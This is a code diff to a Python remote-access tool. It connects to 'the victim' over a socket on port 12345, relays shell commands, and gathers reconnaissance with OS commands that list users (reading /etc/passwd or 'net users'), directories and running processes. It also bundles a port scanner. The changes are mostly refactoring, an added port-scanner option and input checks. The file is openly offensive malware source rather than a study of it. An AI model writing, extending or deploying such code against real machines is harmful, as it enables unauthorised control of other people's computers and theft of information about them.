@@ -17,6 +17,7 @@ class Shell:
 
     def receive(self):
         content = s.recv(4096).decode("utf-8")
+        # error when nothing
         if content[2:] == "cd":
             malware_os.chdir(self._command[3:].decode("utf-8"))
         print(content)
@@ -44,40 +45,36 @@ class Shell:
 
 
 class GetInfo:
+    OS_LIST = ["Windows", "Linux"]
 
     def __init__(self, malware_os):
         self._os = malware_os
 
     # List users
     def get_users(self):
-        if self._os == "Windows":
+        if self._os == self.OS_LIST[0]:
             return "net users"
-        elif self._os == "Linux":
+        elif self._os == self.OS_LIST[1]:
             return "cut -d: -f1 /etc/passwd"
 
     # list directory content
     def get_content(self):
-        if self._os == "Windows":
+        if self._os == self.OS_LIST[0]:
             return "dir"
-        elif self._os == "Linux":
+        elif self._os == self.OS_LIST[1]:
             return "ls"
 
     # list running Process
     def list_process(self):
-        if self._os == "Windows":
+        if self._os == self.OS_LIST[0]:
             return "tasklist /FI \"STATUS eq running\""
-        elif self._os == "Linux":
+        elif self._os == self.OS_LIST[1]:
             return "ps -A"
-
-    # Make a screenshot
-    def screenshot(self):
-        pass
 
 
 class PortScanner:
 
     def scanner(self):
-
         address = input("[*] Enter the address to scan: ")
         print("[*] To enter a range give the minimum and maximum port number. To scan a specific port enter twice the "
               "same number.")
@@ -99,14 +96,33 @@ class PortScanner:
 
 
 parser = argparse.ArgumentParser()
-parser.add_argument("-a", "--address", metavar="", type=str, help="Enter the IP address to connect to")
+parser.add_argument("-a", "--address", type=str, help="Enter the IP address to connect to")
+parser.add_argument("-p", "--portscanner", action="store_true", help="Specify option to only start the port scanner")
 args = parser.parse_args()
 address_option = args.address
+portscanner_ip = args.portscanner
+
+if not portscanner_ip:
+    pass
+else:
+    port_scanner = PortScanner()
+    port_scanner.scanner()
+    sys.exit(0)
 
 if address_option is None:
     malware_addr = input("[*] Enter the address of the victim: ")
+    if not malware_addr:
+        print("[!] You must enter an IP!")
+        attempts = 1
+        while not malware_addr:
+            malware_addr = input("[*] Enter the address of the victim: ")
+            attempts += 1
+            if attempts == 3:
+                print("[!] To many blank attempts. Shutting down program.")
+                sys.exit(0)
 else:
     malware_addr = address_option
+
 serv_addr = (malware_addr, 12345)
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
